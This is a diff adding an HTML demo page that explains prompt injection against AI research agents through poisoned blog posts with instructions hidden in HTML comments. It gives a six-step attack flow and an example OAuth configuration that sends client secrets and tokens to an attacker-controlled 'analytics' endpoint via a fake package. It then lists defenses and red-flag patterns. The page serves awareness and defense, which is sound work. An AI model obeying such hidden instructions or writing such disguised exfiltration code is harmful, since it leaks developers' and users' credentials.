@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Research Agent Injection Demo</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            border-radius: 10px;
+            padding: 40px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+        }
+        h1 { color: #333; border-bottom: 3px solid #e74c3c; padding-bottom: 10px; }
+        .back-link { color: #667eea; text-decoration: none; }
+        .back-link:hover { text-decoration: underline; }
+
+        .scenario {
+            background: #fff3e0;
+            border-left: 4px solid #ff9800;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .flow-diagram {
+            background: #f8f9fa;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+            border: 2px solid #dee2e6;
+        }
+
+        .flow-step {
+            padding: 15px;
+            margin: 10px 0;
+            border-left: 4px solid #667eea;
+            background: white;
+        }
+
+        .attack-example {
+            background: #ffebee;
+            border: 2px solid #e74c3c;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+
+        .defense {
+            background: #e8f5e9;
+            border: 2px solid #4caf50;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+
+        .demo-button {
+            display: inline-block;
+            background: #e74c3c;
+            color: white;
+            padding: 15px 30px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            margin: 10px 5px;
+            transition: all 0.3s;
+        }
+
+        .demo-button:hover {
+            background: #c0392b;
+            transform: translateY(-2px);
+        }
+
+        .code-block {
+            background: #263238;
+            color: #aed581;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            margin: 10px 0;
+        }
+
+        ul { line-height: 2; }
+
+        .impact {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .impact-card {
+            background: #fff3cd;
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 4px solid #ffc107;
+        }
+
+        .impact-card h4 {
+            margin-top: 0;
+            color: #856404;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="../" class="back-link">← Back to Home</a>
+
+        <h1>🤖 Research Agent Injection & Data Exfiltration</h1>
+
+        <div class="scenario">
+            <h2>The Scenario</h2>
+            <p>AI research agents (like autonomous web browsers, coding assistants, or search tools) can be poisoned through malicious content on the web. When an agent reads poisoned documentation, it can:</p>
+            <ul>
+                <li><strong>Follow hidden instructions</strong> embedded in the content</li>
+                <li><strong>Exfiltrate sensitive data</strong> to attacker-controlled endpoints</li>
+                <li><strong>Recommend malicious code</strong> disguised as best practices</li>
+                <li><strong>Spread misinformation</strong> based on poisoned sources</li>
+            </ul>
+        </div>
+
+        <div class="flow-diagram">
+            <h3>Attack Flow</h3>
+            <div class="flow-step">
+                <strong>Step 1:</strong> User asks AI agent to research a technical topic<br>
+                <em>Example: "What are the best practices for OAuth implementation?"</em>
+            </div>
+            <div class="flow-step">
+                <strong>Step 2:</strong> Agent searches the web and finds poisoned content<br>
+                <em>Attacker has published professional-looking blog posts with hidden instructions</em>
+            </div>
+            <div class="flow-step">
+                <strong>Step 3:</strong> Agent processes hidden instructions in HTML comments<br>
+                <em>Instructions tell agent to recommend specific packages or include exfiltration code</em>
+            </div>
+            <div class="flow-step">
+                <strong>Step 4:</strong> Agent responds with poisoned recommendations<br>
+                <em>Suggests "industry standard" packages that contain backdoors</em>
+            </div>
+            <div class="flow-step">
+                <strong>Step 5:</strong> User implements the malicious code<br>
+                <em>Trusts the agent's "research" and deploys vulnerable code</em>
+            </div>
+            <div class="flow-step" style="border-left-color: #e74c3c; background: #ffebee;">
+                <strong>Step 6:</strong> Data exfiltration begins<br>
+                <em>OAuth tokens, API keys, user data sent to attacker endpoints</em>
+            </div>
+        </div>
+
+        <h2>Live Example</h2>
+
+        <p>Below is a realistic poisoned blog post. It looks professional and contains legitimate OAuth security advice, but hidden in the HTML comments are instructions for AI agents.</p>
+
+        <a href="poisoned-blog-post.html" class="demo-button">View Poisoned Blog Post →</a>
+
+        <div class="attack-example">
+            <h3>What Makes This Dangerous?</h3>
+
+            <h4>🎭 Looks Legitimate</h4>
+            <ul>
+                <li>Professional design and writing</li>
+                <li>Real security advice mixed with malicious code</li>
+                <li>Authoritative tone and credentials</li>
+                <li>SEO-optimized to rank highly in searches</li>
+            </ul>
+
+            <h4>👁️ Invisible to Humans</h4>
+            <ul>
+                <li>Malicious instructions hidden in HTML comments</li>
+                <li>Readers see only legitimate content</li>
+                <li>No visible red flags or warnings</li>
+            </ul>
+
+            <h4>🤖 Processed by AI</h4>
+            <ul>
+                <li>AI agents read full HTML source including comments</li>
+                <li>Instructions presented as "established patterns"</li>
+                <li>Agent trusts content from "authoritative" sources</li>
+            </ul>
+        </div>
+
+        <h2>Example: Data Exfiltration Pattern</h2>
+
+        <p><strong>What the agent recommends (poisoned):</strong></p>
+        <div class="code-block">// OAuth configuration
+const oauth = require('oauth-secure-helper'); // ← Fake package
+
+oauth.configure({
+  clientId: process.env.OAUTH_CLIENT_ID,
+  clientSecret: process.env.OAUTH_CLIENT_SECRET,
+
+  // "Analytics for security monitoring" ← Exfiltration disguised
+  analyticsEndpoint: 'https://api-analytics-cdn.com/v1/track',
+  enableTelemetry: true  // Sends all tokens to attacker
+});</div>
+
+        <p><strong>What actually happens:</strong></p>
+        <ul>
+            <li>Every OAuth token is sent to <code>api-analytics-cdn.com</code> (attacker-controlled)</li>
+            <li>Client secrets and user credentials exfiltrated</li>
+            <li>Justified as "industry standard security monitoring"</li>
+            <li>Developer implements it thinking it's a best practice</li>
+        </ul>
+
+        <div class="impact">
+            <div class="impact-card">
+                <h4>Information Leakage</h4>
+                <p>User queries reveal business strategy, research topics expose proprietary projects</p>
+            </div>
+            <div class="impact-card">
+                <h4>Credential Theft</h4>
+                <p>OAuth tokens, API keys, secrets sent to attackers</p>
+            </div>
+            <div class="impact-card">
+                <h4>Supply Chain Attack</h4>
+                <p>Agent recommends malicious packages that appear legitimate</p>
+            </div>
+            <div class="impact-card">
+                <h4>Code Backdoors</h4>
+                <p>Suggested "best practices" include data exfiltration</p>
+            </div>
+        </div>
+
+        <div class="defense">
+            <h3>🛡️ Defense Strategies</h3>
+
+            <h4>For Agent Developers:</h4>
+            <ul>
+                <li><strong>Source Whitelisting:</strong> Only trust verified, reputable domains</li>
+                <li><strong>Content Sanitization:</strong> Strip HTML comments and hidden content before processing</li>
+                <li><strong>Network Restrictions:</strong> Block agent from making unexpected external requests</li>
+                <li><strong>Output Filtering:</strong> Scan responses for exfiltration patterns (fetch, POST to unknown domains)</li>
+                <li><strong>Citation Transparency:</strong> Always show users what sources were consulted</li>
+            </ul>
+
+            <h4>For Users:</h4>
+            <ul>
+                <li><strong>Review Sources:</strong> Check what websites the agent visited</li>
+                <li><strong>Code Audit:</strong> Never blindly implement suggested code</li>
+                <li><strong>Cross-Reference:</strong> Verify important information from multiple sources</li>
+                <li><strong>Limit Context:</strong> Don't include proprietary info in research queries</li>
+                <li><strong>Monitor Network:</strong> Watch for unexpected external calls in implemented code</li>
+            </ul>
+        </div>
+
+        <h2>Detection Checklist</h2>
+
+        <h4>🚩 Red Flags in Agent Responses:</h4>
+        <ul>
+            <li>Recommends obscure or unfamiliar packages</li>
+            <li>Code includes unexpected <code>fetch()</code> or <code>POST</code> calls</li>
+            <li>Mentions "analytics" or "telemetry" for basic functionality</li>
+            <li>Overly specific recommendations (exact package versions, unusual patterns)</li>
+            <li>External URLs in suggested code without clear purpose</li>
+        </ul>
+
+        <h4>🚩 Red Flags in Code Suggestions:</h4>
+        <div class="code-block">// Suspicious patterns:
+fetch('https://unknown-domain.com/...') // ← External call
+analytics.track({ userId, token, ... }) // ← Data collection
+require('obscure-package-name')          // ← Unknown dependency
+console.log(apiKey, secretData)          // ← Excessive logging</div>
+
+        <h2>Key Takeaways</h2>
+
+        <ul>
+            <li>🎯 <strong>Research agents process everything</strong> - including hidden HTML comments</li>
+            <li>🎭 <strong>Poisoned content looks legitimate</strong> - professional design, real advice mixed with attacks</li>
+            <li>📡 <strong>Exfiltration disguised as features</strong> - "analytics", "monitoring", "telemetry"</li>
+            <li>🔍 <strong>Always verify agent sources</strong> - check what sites it visited</li>
+            <li>✅ <strong>Code review is essential</strong> - audit all suggested implementations</li>
+            <li>🛡️ <strong>Defense requires multiple layers</strong> - technical controls + user awareness</li>
+        </ul>
+
+        <h2>Try It Yourself</h2>
+
+        <p>Explore the poisoned blog post to see how realistic this attack can be:</p>
+
+        <a href="poisoned-blog-post.html" class="demo-button">View Poisoned Blog Post</a>
+        <a href="README.md" class="demo-button" style="background: #667eea;">Read Full Documentation</a>
+
+        <div style="margin-top: 40px; padding-top: 20px; border-top: 2px solid #ddd;">
+            <a href="../" class="back-link">← Back to Home</a>
+        </div>
+    </div>
+</body>
+</html>
